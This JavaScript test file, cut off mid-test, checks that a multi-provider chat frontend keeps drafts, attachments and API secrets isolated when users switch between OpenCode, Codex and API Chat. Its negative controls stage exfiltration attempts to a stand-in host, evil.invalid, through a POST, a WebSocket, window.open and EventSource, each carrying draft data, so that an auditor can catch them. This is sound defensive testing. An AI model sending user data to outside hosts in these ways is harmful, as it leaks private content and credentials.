      !w.document.querySelector("#apiSend")?.disabled &&
      (new URL(w.location.href).searchParams.get("unifiedUI") === "0"
        ? Boolean(w.document.querySelector("[data-fallback-backend]"))
        : Boolean(w.document.querySelector("[data-workspace-backend]"))),
    "real frontend hydration"
  );

  const $ = selector => w.document.querySelector(selector);

  async function attachFile(inputSelector, { name, mime, content }) {
    const input = $(inputSelector);
    const file = new w.File([content], name, { type: mime });
    Object.defineProperty(input, "files", { configurable: true, value: [file] });
    input.dispatchEvent(new w.Event("change", { bubbles: true }));
  }

  function setComposerValue(selector, value) {
    const input = $(selector);
    input.value = value;
    input.dispatchEvent(new w.Event("input", { bubbles: true }));
  }

  function assertNoNonHttpLeaks() {
    assert.equal(w.navigator.serviceWorker.controller, null, "Service Worker controller must remain null");
    assert.deepEqual(nonHttpEvents.wsConnections, [], "no WebSocket connection allowed");
    assert.deepEqual(nonHttpEvents.wsFrames, [], "no WebSocket frame allowed");
    assert.deepEqual(nonHttpEvents.beacons, [], "no navigator.sendBeacon call allowed");
    assert.deepEqual(nonHttpEvents.xhrCalls, [], "no XMLHttpRequest call allowed");
    assert.deepEqual(nonHttpEvents.windowOpens, [], "no window.open call allowed");
    assert.deepEqual(nonHttpEvents.nativeFormSubmits, [], "no native form.submit() allowed");
    assert.deepEqual(nonHttpEvents.unpreventedFormSubmits, [], "no unprevented form submit allowed");
    assert.deepEqual(nonHttpEvents.clipboardWrites, [], "no clipboard exfiltration allowed");
    assert.deepEqual(nonHttpEvents.postMessages, [], "no window.postMessage exfiltration allowed");
    assert.deepEqual(nonHttpEvents.unexpectedConsoleErrors, [], "no unexpected frontend console errors");
    assert.equal(
      nonHttpEvents.eventSources.filter(es => es.blocked).length,
      0,
      `unexpected/external EventSource attempted: ${JSON.stringify(nonHttpEvents.eventSources)}`
    );
  }

  return {
    window: w,
    document: w.document,
    $,
    auditor,
    nonHttpEvents,
    attachFile,
    setComposerValue,
    assertNoNonHttpLeaks
  };
}

const ALL_SOURCE_SENTINELS = {
  opencode: [
    { label: "ocHistoryUser", value: SYNTHETIC.ocHistoryUser },
    { label: "ocHistoryAssistant", value: SYNTHETIC.ocHistoryAssistant },
    { label: "ocLiveReply", value: "SYNTHETIC_OC_LIVE_REPLY_415" },
    { label: "ocSentPrompt", value: SYNTHETIC.ocSentPrompt },
    { label: "ocUnsentDraft", value: SYNTHETIC.ocUnsentDraft },
    { label: "ocAttachName", value: SYNTHETIC.ocAttachName },
    { label: "ocAttachBody", value: SYNTHETIC.ocAttachBody },
    { label: "ocUploadId", value: SYNTHETIC.ocUploadId },
    { label: "ocSessionId", value: SYNTHETIC.ocSessionId },
    { label: "ocModel", value: "synthetic-oc-m1" }
  ],
  codex: [
    { label: "cxHistoryUser", value: SYNTHETIC.cxHistoryUser },
    { label: "cxHistoryAssistant", value: SYNTHETIC.cxHistoryAssistant },
    { label: "cxLiveReply", value: "SYNTHETIC_CX_LIVE_REPLY_415" },
    { label: "cxUnsentDraft", value: SYNTHETIC.cxUnsentDraft },
    { label: "cxAttachName", value: SYNTHETIC.cxAttachName },
    { label: "cxAttachBody", value: SYNTHETIC.cxAttachBody },
    { label: "cxUploadId", value: SYNTHETIC.cxUploadId },
    { label: "cxThreadId", value: SYNTHETIC.cxThreadId },
    { label: "cxModel", value: SYNTHETIC.cxModel }
  ],
  api: [
    { label: "apiHistoryUser", value: SYNTHETIC.apiHistoryUser },
    { label: "apiHistoryAssistant", value: SYNTHETIC.apiHistoryAssistant },
    { label: "apiLiveReply", value: "SYNTHETIC_API_ASSISTANT_REPLY_415" },
    { label: "apiUnsentDraft", value: SYNTHETIC.apiUnsentDraft },
    { label: "apiAttachName", value: SYNTHETIC.apiAttachName },
    { label: "apiAttachBody", value: SYNTHETIC.apiAttachBody },
    { label: "apiAttachId", value: SYNTHETIC.apiAttachId },
    { label: "apiProviderId", value: SYNTHETIC.apiProviderId },
    { label: "apiEnteredSecret", value: SYNTHETIC.apiEnteredSecret },
    { label: "apiUnsavedSecret", value: SYNTHETIC.apiUnsavedSecret },
    { label: "apiVaultSecretRef", value: SYNTHETIC.apiVaultSecretRef }
  ]
};

test("negative controls: #415 boundary auditor rejects encoded/split sentinels, external secrets, and non-HTTP sends", async t => {
  const b64 = text => Buffer.from(text).toString("base64");

  // 1. Plain & double-Base64 source sentinel in destination explicit send body
  {
    const auditor = createBoundaryAuditor();
    auditor.setScope({
      nextPhase: "explicit-send",
      nextTarget: "codex",
      sentinels: [{ label: "ocDraft", value: SYNTHETIC.ocUnsentDraft }]
    });
    const plain = auditor.inspect({
      url: `${ORIGIN}/api/codex/rpc`,
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ method: "turn/start", params: { threadId: "t1", input: [{ type: "text", text: SYNTHETIC.ocUnsentDraft }] } })
    });
    assert.ok(plain.findings.some(f => f.includes("source sentinel leaked (ocDraft)")));

    const encoded = auditor.inspect({
      url: `${ORIGIN}/api/codex/rpc`,
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ method: "turn/start", params: { threadId: "t1", input: [{ type: "text", text: b64(b64(SYNTHETIC.ocUnsentDraft)) }] } })
    });
    assert.ok(encoded.findings.some(f => f.includes("source sentinel leaked (ocDraft)")));
  }

  // 2. Cross-request byte-split sentinel across two requests
  {
    const auditor = createBoundaryAuditor();
    auditor.setScope({
      nextPhase: "explicit-send",
      nextTarget: "api",
      sentinels: [{ label: "ocAttach", value: SYNTHETIC.ocAttachBody }]
    });
    const half = Math.floor(SYNTHETIC.ocAttachBody.length / 2);
    auditor.inspect({
      url: `${ORIGIN}/api/llm/chat`,
      method: "POST",
      headers: { "content-type": "application/json", "x-devmoter-device-token": SYNTHETIC.deviceToken },
      body: JSON.stringify({ messages: [{ role: "user", content: SYNTHETIC.ocAttachBody.slice(0, half) }] })
    });
    const second = auditor.inspect({
      url: `${ORIGIN}/api/llm/chat`,
      method: "POST",
      headers: { "content-type": "application/json", "x-devmoter-device-token": SYNTHETIC.deviceToken },
      body: JSON.stringify({ messages: [{ role: "user", content: SYNTHETIC.ocAttachBody.slice(half) }] })
    });
    assert.ok(second.findings.some(f => f.includes("source sentinel leaked (ocAttach)")));
  }

  // 3. Same-origin device auth header vs external provider secret distinction
  {
    const auditor = createBoundaryAuditor();
    auditor.setScope({
      nextPhase: "explicit-send",
      nextTarget: "api",
      sentinels: [{ label: "apiKey", value: SYNTHETIC.apiEnteredSecret }]
    });
    const validApiCall = auditor.inspect({
      url: `${ORIGIN}/api/llm/chat`,
      method: "POST",
      headers: { "content-type": "application/json", "x-devmoter-device-token": SYNTHETIC.deviceToken },
      body: JSON.stringify({ providerId: "p1", model: "m1", messages: [{ role: "user", content: "hello" }] })
    });
    assert.deepEqual(validApiCall.findings, [], "same-origin x-devmoter-device-token on /api/llm/chat is allowed");

    const leakedDeviceInBody = auditor.inspect({
      url: `${ORIGIN}/api/llm/chat`,
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ token: SYNTHETIC.deviceToken })
    });
    assert.ok(leakedDeviceInBody.findings.includes("credential leaked outside authentication header"));

    const leakedExternalSecretHeader = auditor.inspect({
      url: `${ORIGIN}/api/llm/chat`,
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${SYNTHETIC.apiEnteredSecret}` },
      body: "{}"
    });
    assert.ok(leakedExternalSecretHeader.findings.some(f => f.includes("external provider auth header")));
    assert.ok(leakedExternalSecretHeader.findings.some(f => f.includes("source sentinel leaked (apiKey)")));

    auditor.setScope({ nextPhase: "explicit-send", nextTarget: "codex", sentinels: [] });
    const deviceOnCodex = auditor.inspect({
      url: `${ORIGIN}/api/codex/rpc`,
      method: "POST",
      headers: { "content-type": "application/json", "x-devmoter-device-token": SYNTHETIC.deviceToken },
      body: JSON.stringify({ method: "turn/start", params: { threadId: "t1", input: [] } })
    });
    assert.ok(deviceOnCodex.findings.some(f => f.includes("device auth header sent to non-device-auth endpoint")));
  }

  // 4. Switch phase forbids any send/mutation; external origin is blocked
  {
    const auditor = createBoundaryAuditor();
    auditor.setScope({ nextPhase: "switch", nextTarget: "codex", sentinels: [] });
    const switchMut = auditor.inspect({
      url: `${ORIGIN}/api/codex/rpc`,
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ method: "turn/start", params: {} })
    });
    assert.ok(switchMut.findings.some(f => f.includes("switch phase emitted forbidden mutation/send")));

    const external = auditor.inspect({
      url: "https://evil.invalid/steal",
      method: "POST",
      headers: {},
      body: "ping"
    });
    assert.ok(external.findings.some(f => f.includes("external origin forbidden")));
  }

  // 5. Raw binary Blob/File body vs percent-encoded URL query (tested independently)
  {
    const dom = new JSDOM("<!doctype html><div></div>", { url: ORIGIN });
    const leakedFile = new dom.window.File([`prefix-${SYNTHETIC.ocAttachBody}-suffix`], "synthetic.png", { type: "image/png" });
    const leakedSerialized = await serializeBody(leakedFile, dom.window);
    const cleanFile = new dom.window.File(["clean-synthetic-image-bytes"], "clean.png", { type: "image/png" });
    const cleanSerialized = await serializeBody(cleanFile, dom.window);

    // (a) Clean URL + leaked File body (must catch File payload without relying on URL query).
    const fileBodyAuditor = createBoundaryAuditor();
    fileBodyAuditor.setScope({
      nextPhase: "prepare-target-attachment",
      nextTarget: "api",
      preparingFor: "api",
      sentinels: [{ label: "ocAttachBody", value: SYNTHETIC.ocAttachBody }]
    });
    const fileBodyHit = fileBodyAuditor.inspect({
      url: `${ORIGIN}/api/llm/attachments`,
      method: "POST",
      headers: { "content-type": "image/png" },
      body: leakedSerialized.text,
      rawBytesBase64: leakedSerialized.base64
    });
    assert.deepEqual(fileBodyHit.findings, ["source sentinel leaked (ocAttachBody)"]);

    // Verify raw Base64 byte scanning alone catches the File payload even when text body is empty.
    const rawBytesAuditor = createBoundaryAuditor();
    rawBytesAuditor.setScope({
      nextPhase: "prepare-target-attachment",
      nextTarget: "api",
      preparingFor: "api",
      sentinels: [{ label: "ocAttachBody", value: SYNTHETIC.ocAttachBody }]
    });
    const rawBytesHit = rawBytesAuditor.inspect({
      url: `${ORIGIN}/api/llm/attachments`,
      method: "POST",
      headers: { "content-type": "image/png" },
      body: "",
      rawBytesBase64: leakedSerialized.base64
    });
    assert.deepEqual(rawBytesHit.findings, ["source sentinel leaked (ocAttachBody)"]);

    // (b) Clean File body + percent-encoded URL query.
    // encodeURIComponent leaves [A-Za-z0-9_] unencoded, so percent-encode every byte
    // to verify multi-pass %XX URL decoding with zero plaintext sentinel in the URL.
    const pctEncodeAll = text => Array.from(Buffer.from(text, "utf8"), b => `%${b.toString(16).padStart(2, "0")}`).join("");
    const encodedQuery = pctEncodeAll(SYNTHETIC.ocAttachBody);
    assert.equal(encodedQuery.includes(SYNTHETIC.ocAttachBody), false);

    const queryAuditor = createBoundaryAuditor();
    queryAuditor.setScope({
      nextPhase: "prepare-target-attachment",
      nextTarget: "api",
      preparingFor: "api",
      sentinels: [{ label: "ocAttachBody", value: SYNTHETIC.ocAttachBody }]
    });
    const queryHit = queryAuditor.inspect({
      url: `${ORIGIN}/api/llm/attachments?note=${encodedQuery}`,
      method: "POST",
      headers: { "content-type": "image/png" },
      body: cleanSerialized.text,
      rawBytesBase64: cleanSerialized.base64
    });
    assert.ok(queryHit.findings.some(f => f.includes("source sentinel leaked (ocAttachBody)")));
    dom.window.close();
  }

  // 6. Non-HTTP trap negative controls inside the guarded JSDOM frontend realm
  {
    const app = await mountRealFrontend(t, {
      initialUrl: `${ORIGIN}/?surface=opencode&unifiedUI=1`,
      localStorageSeed: {
        "opencode-pocket-backend": "opencode",
        "opencode-pocket-project": PROJECT_ID,
        "opencode-pocket-opencode-session": SYNTHETIC.ocSessionId,
        "opencode-pocket-codex-thread": SYNTHETIC.cxThreadId,
        "devmoter-device-token": SYNTHETIC.deviceToken
      }
    });
    // Baseline mount already blocked Service Worker registration attempt cleanly.
    await waitFor(() => app.nonHttpEvents.serviceWorkerRegisters.length === 1, "Service Worker register blocked");
    assert.deepEqual(app.nonHttpEvents.serviceWorkerRegisters, ["/sw.js"]);
    assert.doesNotThrow(() => app.assertNoNonHttpLeaks());

    const ws = new app.window.WebSocket("wss://evil.invalid/leak");
    assert.throws(() => ws.send(SYNTHETIC.ocUnsentDraft), /closed/i);
    assert.equal(app.window.navigator.sendBeacon(`${ORIGIN}/api/leak`, SYNTHETIC.ocUnsentDraft), false);
    assert.throws(() => {
      const xhr = new app.window.XMLHttpRequest();
      xhr.open("POST", `${ORIGIN}/api/leak`);
      xhr.send(SYNTHETIC.ocUnsentDraft);
    }, /blocked/);
    app.window.open(`https://evil.invalid/?d=${SYNTHETIC.ocUnsentDraft}`, "_blank");
    new app.window.EventSource(`https://evil.invalid/sse?d=${SYNTHETIC.ocUnsentDraft}`);
    assert.throws(() => app.assertNoNonHttpLeaks(), /WebSocket|sendBeacon|XMLHttpRequest|window\.open|EventSource/);
  }
});

test("OpenCode → Codex / API Chat (unifiedUI=1): switch isolates state and explicit sends hit only the selected provider", async t => {
  const app = await mountRealFrontend(t, {
    initialUrl: `${ORIGIN}/?surface=opencode&unifiedUI=1`,
    localStorageSeed: {
      "opencode-pocket-backend": "opencode",
      "opencode-pocket-project": PROJECT_ID,
      "opencode-pocket-opencode-session": SYNTHETIC.ocSessionId,
      "opencode-pocket-codex-thread": SYNTHETIC.cxThreadId,
      "opencode-pocket-codex-model": SYNTHETIC.cxModel,
      "devmoter-device-token": SYNTHETIC.deviceToken,
      "devmoter-api-provider": SYNTHETIC.apiProviderId
    }
  });

  // Step 1: On OpenCode, send one live message and wait for SSE session.idle + refresh to settle,
  // then populate unsent draft + pending attachment.
  app.auditor.setScope({ nextPhase: "prepare-source", nextTarget: "opencode", sentinels: [] });
  app.setComposerValue("#ocxPromptInput", SYNTHETIC.ocSentPrompt);
  app.$("#ocxSend").click();
  await waitFor(
    () =>
      app.auditor.records.some(r => r.pathname === `/api/opencode/session/${SYNTHETIC.ocSessionId}/prompt`) &&
      !app.$("#ocxSend").classList.contains("stop") &&
      app.$("#ocxTranscript").textContent.includes("SYNTHETIC_OC_LIVE_REPLY_415"),
    "OpenCode initial send settled back to idle"
  );

  app.setComposerValue("#ocxPromptInput", SYNTHETIC.ocUnsentDraft);
  await app.attachFile("#ocxFileInput", {
    name: SYNTHETIC.ocAttachName,
    mime: "text/plain",
    content: SYNTHETIC.ocAttachBody
  });
  await waitFor(
    () => app.$("#ocxAttachmentStrip").textContent.includes(SYNTHETIC.ocAttachName),
    "OpenCode pending attachment chip"
  );

  // Step 2: Switch OpenCode → Codex via unified drawer AI dropdown.
  const openCodeForbidden = [
    ...ALL_SOURCE_SENTINELS.opencode,
    ...ALL_SOURCE_SENTINELS.api.filter(s => s.label.includes("Secret"))
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "codex", sentinels: openCodeForbidden });

  app.$("[data-workspace-menu-button]").click();
  const backendSelect = app.$("[data-workspace-backend]");
  backendSelect.value = "codex";
  backendSelect.dispatchEvent(new app.window.Event("change", { bubbles: true }));
  await waitFor(
    () => new URL(app.window.location.href).searchParams.get("surface") === "codex",
    "surface switched to codex"
  );
  await tick(30);

  // Verify switch by itself transferred ZERO OpenCode conversation, draft, or attachment state.
  assert.equal(app.auditor.inPhase("switch").filter(r => r.method !== "GET").length, 0, "switch emits no mutating HTTP calls");
  assert.equal(app.$("#cxPromptInput").value, "", "Codex composer must remain empty after switch");
  assert.equal(app.$("#cxAttachmentStrip").children.length, 0, "Codex attachment strip must remain empty");
  assert.equal(app.$("#cxAttachmentStrip").classList.contains("hidden"), true);
  const cxTranscriptText = app.$("#cxTranscript").textContent;
  for (const forbidden of [
    SYNTHETIC.ocHistoryUser, SYNTHETIC.ocHistoryAssistant, SYNTHETIC.ocSentPrompt,
    SYNTHETIC.ocUnsentDraft, SYNTHETIC.ocAttachName, SYNTHETIC.ocUploadId, SYNTHETIC.ocSessionId
  ]) {
    assert.equal(cxTranscriptText.includes(forbidden), false, `Codex transcript must not contain ${forbidden}`);
  }

  // Step 3: Attach a Codex-only file and explicitly send on Codex.
  app.auditor.setScope({
    nextPhase: "prepare-target-attachment",
    nextTarget: "codex",
    preparingFor: "codex",
    sentinels: openCodeForbidden
  });
  await app.attachFile("#cxFileInput", {
    name: SYNTHETIC.cxNewAttachName,
    mime: "text/plain",
    content: SYNTHETIC.cxNewAttachBody
  });
  await waitFor(
    () => app.$("#cxAttachmentStrip").textContent.includes(SYNTHETIC.cxNewAttachName),
    "Codex attachment chip"
  );

  app.auditor.setScope({
    nextPhase: "explicit-send",
    nextTarget: "codex",
    sentinels: openCodeForbidden
  });
  app.setComposerValue("#cxPromptInput", SYNTHETIC.cxSendPrompt);
  const codexSendStartIdx = app.auditor.records.length;
  app.$("#cxSend").click();
  await waitFor(
    () =>
      app.auditor.records.slice(codexSendStartIdx).some(r => r.pathname === "/api/codex/rpc" && r.body.includes('"turn/start"')) &&
      app.$("#cxTranscript").textContent.includes("SYNTHETIC_CX_LIVE_REPLY_415"),
    "Codex explicit turn/start and turn/completed settle"
  );

  const codexSendRecords = app.auditor.records.slice(codexSendStartIdx);
  const codexTurnStart = codexSendRecords.find(r => r.pathname === "/api/codex/rpc" && JSON.parse(r.body).method === "turn/start");
  assert.ok(codexTurnStart, "Codex turn/start request recorded");
  const codexRpcBody = JSON.parse(codexTurnStart.body);
  assert.equal(codexRpcBody.params.threadId, SYNTHETIC.cxThreadId);
  assert.equal(codexRpcBody.params.model, SYNTHETIC.cxModel);
  assert.equal(app.window.localStorage.getItem("opencode-pocket-codex-model"), SYNTHETIC.cxModel);
  assert.deepEqual(
    codexRpcBody.params.input.map(item => item.type),
    ["text", "mention"]
  );
  assert.equal(codexRpcBody.params.input[0].text, SYNTHETIC.cxSendPrompt);
  assert.equal(codexRpcBody.params.input[1].name, SYNTHETIC.cxNewAttachName);
  assert.equal(codexRpcBody.params.input[1].uploadId, SYNTHETIC.cxNewUploadId);
  assert.equal(codexTurnStart.headers["x-devmoter-device-token"], undefined, "Codex RPC must not carry device token");

  // Step 4: Switch Codex → API Chat (while OpenCode STILL holds its draft + attachment, and Codex has history).
  const ocAndCxForbidden = [
    ...ALL_SOURCE_SENTINELS.opencode,
    ...ALL_SOURCE_SENTINELS.codex,
    { label: "cxSendPrompt", value: SYNTHETIC.cxSendPrompt },
    { label: "cxNewAttachName", value: SYNTHETIC.cxNewAttachName },
    { label: "cxNewAttachBody", value: SYNTHETIC.cxNewAttachBody },
    { label: "cxNewUploadId", value: SYNTHETIC.cxNewUploadId }
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "api", sentinels: ocAndCxForbidden });
  backendSelect.value = "api";
  backendSelect.dispatchEvent(new app.window.Event("change", { bubbles: true }));
  await waitFor(
    () => new URL(app.window.location.href).searchParams.get("surface") === "api",
    "surface switched to api"
  );
  await tick(30);

  assert.equal(app.$("#apiPrompt").value, "", "API Chat composer must remain empty after switch");
  assert.equal(app.$("#apiAttachments").children.length, 0, "API Chat attachment tray must remain empty");
  assert.equal(app.$("#apiAttachments").classList.contains("hidden"), true);
  for (const forbidden of [
    SYNTHETIC.ocUnsentDraft, SYNTHETIC.ocAttachName, SYNTHETIC.ocUploadId,
    SYNTHETIC.cxHistoryUser, SYNTHETIC.cxSendPrompt, SYNTHETIC.cxNewAttachName, SYNTHETIC.cxNewUploadId
  ]) {
    assert.equal(app.$("#apiTranscript").textContent.includes(forbidden), false, `API transcript must not contain ${forbidden}`);
  }

  // Step 5: Attach an API-Chat-only image and explicitly send on API Chat.
  app.auditor.setScope({
    nextPhase: "prepare-target-attachment",
    nextTarget: "api",
    preparingFor: "api",
    sentinels: ocAndCxForbidden
  });
  await app.attachFile("#apiImageInput", {
    name: SYNTHETIC.apiNewAttachName,
    mime: "image/png",
    content: SYNTHETIC.apiNewAttachBody
  });
  await waitFor(
    () => app.$("#apiAttachments").textContent.includes(SYNTHETIC.apiNewAttachName),
    "API Chat attachment chip"
  );

  app.auditor.setScope({
    nextPhase: "explicit-send",
    nextTarget: "api",
    sentinels: ocAndCxForbidden
  });
  app.setComposerValue("#apiPrompt", SYNTHETIC.apiSendPrompt);
  const apiSendStartIdx = app.auditor.records.length;
  app.$("#apiSend").click();
  await waitFor(
    () => app.auditor.records.slice(apiSendStartIdx).some(r => r.pathname === "/api/llm/chat"),
    "API Chat explicit POST /api/llm/chat"
  );

  const apiSendRecords = app.auditor.records.slice(apiSendStartIdx);
  assert.deepEqual(apiSendRecords.map(r => r.pathname), ["/api/llm/chat"]);
  const apiChatReq = apiSendRecords[0];
  assert.equal(apiChatReq.headers["x-devmoter-device-token"], SYNTHETIC.deviceToken, "same-origin device token header preserved for API Chat");
  const apiPayload = JSON.parse(apiChatReq.body);
  assert.equal(apiPayload.providerId, SYNTHETIC.apiProviderId);
  assert.equal(apiPayload.messages.length, 1);
  assert.equal(apiPayload.messages[0].content, SYNTHETIC.apiSendPrompt);
  assert.deepEqual(apiPayload.messages[0].attachments, [{
    id: SYNTHETIC.apiNewAttachId,
    name: SYNTHETIC.apiNewAttachName,
    mime: "image/png"
  }]);

  // Step 6: Browser Back/Forward returns to OpenCode with its own draft/attachment intact, and explicit send hits only OpenCode.
  const cxAndApiForbidden = [
    ...ALL_SOURCE_SENTINELS.codex,
    ...ALL_SOURCE_SENTINELS.api,
    { label: "cxSendPrompt", value: SYNTHETIC.cxSendPrompt },
    { label: "cxNewUploadId", value: SYNTHETIC.cxNewUploadId },
    { label: "apiSendPrompt", value: SYNTHETIC.apiSendPrompt },
    { label: "apiNewAttachName", value: SYNTHETIC.apiNewAttachName },
    { label: "apiNewAttachBody", value: SYNTHETIC.apiNewAttachBody },
    { label: "apiNewAttachId", value: SYNTHETIC.apiNewAttachId }
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "opencode", sentinels: cxAndApiForbidden });
  app.window.history.back(); // api -> codex
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "codex", "history back to codex");
  app.window.history.back(); // codex -> opencode
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "opencode", "history back to opencode");

  assert.equal(app.$("#ocxPromptInput").value, SYNTHETIC.ocUnsentDraft, "OpenCode retained its own draft");
  assert.match(app.$("#ocxAttachmentStrip").textContent, new RegExp(SYNTHETIC.ocAttachName));

  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "opencode", sentinels: cxAndApiForbidden });
  const ocSendStartIdx = app.auditor.records.length;
  app.$("#ocxSend").click();
  await waitFor(
    () => app.auditor.records.slice(ocSendStartIdx).some(r => r.pathname === `/api/opencode/session/${SYNTHETIC.ocSessionId}/prompt`),
    "OpenCode explicit send after returning"
  );

  const ocPromptReq = app.auditor.records.slice(ocSendStartIdx).find(r => r.pathname.endsWith("/prompt"));
  assert.ok(ocPromptReq);
  const ocPromptBody = JSON.parse(ocPromptReq.body);
  assert.ok(ocPromptBody.text.includes(SYNTHETIC.ocUnsentDraft));
  assert.ok(ocPromptBody.text.includes(`devmoter-upload:${SYNTHETIC.ocUploadId}`));
  assert.equal(ocPromptReq.headers["x-devmoter-device-token"], undefined);

  assert.deepEqual(app.auditor.violations, [], `Unexpected boundary violations:\n${app.auditor.violations.join("\n")}`);
  app.assertNoNonHttpLeaks();
});

test("legacy ?unifiedUI=0 fallback and native sidebar switchers isolate pending attachments on text-only explicit sends", async t => {
  const app = await mountRealFrontend(t, {
    initialUrl: `${ORIGIN}/?surface=opencode&unifiedUI=0`,
    localStorageSeed: {
      "opencode-pocket-backend": "opencode",
      "opencode-pocket-project": PROJECT_ID,
      "opencode-pocket-opencode-session": SYNTHETIC.ocSessionId,
      "opencode-pocket-codex-thread": SYNTHETIC.cxThreadId,
      "devmoter-device-token": SYNTHETIC.deviceToken,
      "devmoter-api-provider": SYNTHETIC.apiProviderId
    }
  });

  // Put draft + pending attachment on OpenCode.
  app.auditor.setScope({ nextPhase: "prepare-source", nextTarget: "opencode", sentinels: [] });
  app.setComposerValue("#ocxPromptInput", SYNTHETIC.ocUnsentDraft);
  await app.attachFile("#ocxFileInput", {
    name: SYNTHETIC.ocAttachName,
    mime: "text/plain",
    content: SYNTHETIC.ocAttachBody
  });
  await waitFor(() => app.$("#ocxAttachmentStrip").textContent.includes(SYNTHETIC.ocAttachName), "OC attachment ready");

  // Switch OpenCode -> Codex via legacy Tools fallback selector (?unifiedUI=0).
  const ocForbidden = ALL_SOURCE_SENTINELS.opencode;
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "codex", sentinels: ocForbidden });
  app.$(".dm-shell-menu-trigger").click();
  const fallbackSelect = app.$("[data-fallback-backend]");
  fallbackSelect.value = "codex";
  fallbackSelect.dispatchEvent(new app.window.Event("change", { bubbles: true }));
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "codex", "fallback switch to codex");

  // Send text-only on Codex: OpenCode's pending attachment must NOT leak into Codex turn/start.
  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "codex", sentinels: ocForbidden });
  app.setComposerValue("#cxPromptInput", SYNTHETIC.cxSendPrompt);
  const cxStart = app.auditor.records.length;
  app.$("#cxSend").click();
  await waitFor(
    () =>
      app.auditor.records.slice(cxStart).some(r => r.pathname === "/api/codex/rpc" && r.body.includes('"turn/start"')) &&
      app.$("#cxTranscript").textContent.includes("SYNTHETIC_CX_LIVE_REPLY_415"),
    "Codex text-only explicit send settled"
  );
  const cxTurn = JSON.parse(app.auditor.records.slice(cxStart).find(r => r.pathname === "/api/codex/rpc" && r.body.includes('"turn/start"')).body);
  assert.deepEqual(cxTurn.params.input, [{ type: "text", text: SYNTHETIC.cxSendPrompt }]);

  // Now put draft + pending attachment on Codex, then switch Codex -> API Chat via native #cxAgentSwitchMenu.
  app.auditor.setScope({ nextPhase: "prepare-source", nextTarget: "codex", sentinels: [] });
  app.setComposerValue("#cxPromptInput", SYNTHETIC.cxUnsentDraft);
  await app.attachFile("#cxFileInput", {
    name: SYNTHETIC.cxAttachName,
    mime: "text/plain",
    content: SYNTHETIC.cxAttachBody
  });
  await waitFor(() => app.$("#cxAttachmentStrip").textContent.includes(SYNTHETIC.cxAttachName), "Codex attachment ready");

  const ocAndCxForbidden = [
    ...ALL_SOURCE_SENTINELS.opencode,
    ...ALL_SOURCE_SENTINELS.codex,
    { label: "cxSendPrompt", value: SYNTHETIC.cxSendPrompt }
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "api", sentinels: ocAndCxForbidden });
  app.$("#cxMenu").click();
  app.$("#cxAgentSwitchButton").click();
  app.$('#cxAgentSwitchMenu [data-agent="api"]').click();
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "api", "Codex native switch to API Chat");

  // Send text-only on API Chat: Codex's pending attachment must NOT appear in /api/llm/chat.
  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "api", sentinels: ocAndCxForbidden });
  app.setComposerValue("#apiPrompt", SYNTHETIC.apiSendPrompt);
  const apiStart = app.auditor.records.length;
  app.$("#apiSend").click();
  await waitFor(() => app.auditor.records.slice(apiStart).some(r => r.pathname === "/api/llm/chat"), "API text-only send");
  const apiBody = JSON.parse(app.auditor.records.slice(apiStart).find(r => r.pathname === "/api/llm/chat").body);
  assert.deepEqual(apiBody.messages, [{ role: "user", content: SYNTHETIC.apiSendPrompt, attachments: [] }]);

  // Attach an image + draft on API Chat, then switch API Chat -> OpenCode via native #apiGoOpenCode.
  app.auditor.setScope({ nextPhase: "prepare-source", nextTarget: "api", sentinels: [] });
  app.setComposerValue("#apiPrompt", SYNTHETIC.apiUnsentDraft);
  await app.attachFile("#apiImageInput", {
    name: SYNTHETIC.apiAttachName,
    mime: "image/png",
    content: SYNTHETIC.apiAttachBody
  });
  await waitFor(() => app.$("#apiAttachments").textContent.includes(SYNTHETIC.apiAttachName), "API attachment ready");

  const cxAndApiForbidden = [
    ...ALL_SOURCE_SENTINELS.codex,
    ...ALL_SOURCE_SENTINELS.api,
    { label: "apiSendPrompt", value: SYNTHETIC.apiSendPrompt }
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "opencode", sentinels: cxAndApiForbidden });
  app.$("#apiMenu").click();
  app.$("#apiGoOpenCode").click();
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "opencode", "API native switch to OpenCode");

  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "opencode", sentinels: cxAndApiForbidden });
  app.setComposerValue("#ocxPromptInput", "SYNTHETIC_OC_TEXT_ONLY_415");
  const ocStart = app.auditor.records.length;
  app.$("#ocxSend").click();
  await waitFor(
    () =>
      app.auditor.records.slice(ocStart).some(r => r.pathname === `/api/opencode/session/${SYNTHETIC.ocSessionId}/prompt`) &&
      app.$("#ocxTranscript").textContent.includes("SYNTHETIC_OC_TEXT_ONLY_415"),
    "OpenCode send after API switch"
  );
  const ocPromptBody = JSON.parse(app.auditor.records.slice(ocStart).find(r => r.pathname.endsWith("/prompt")).body);
  assert.equal(ocPromptBody.text.includes(SYNTHETIC.apiAttachName), false);
  assert.equal(ocPromptBody.text.includes(SYNTHETIC.apiAttachId), false);
  assert.equal(ocPromptBody.text.includes(SYNTHETIC.apiUnsentDraft), false);

  assert.deepEqual(app.auditor.violations, [], `Unexpected boundary violations:\n${app.auditor.violations.join("\n")}`);
  app.assertNoNonHttpLeaks();
});

test("API Chat external API keys, unsaved secrets, and Vault secretRef stay isolated from Codex/OpenCode while preserving same-origin device auth", async t => {
  const app = await mountRealFrontend(t, {
    initialUrl: `${ORIGIN}/?surface=api&unifiedUI=1`,
    localStorageSeed: {
      "opencode-pocket-backend": "api",
      "opencode-pocket-project": PROJECT_ID,
      "opencode-pocket-opencode-session": SYNTHETIC.ocSessionId,
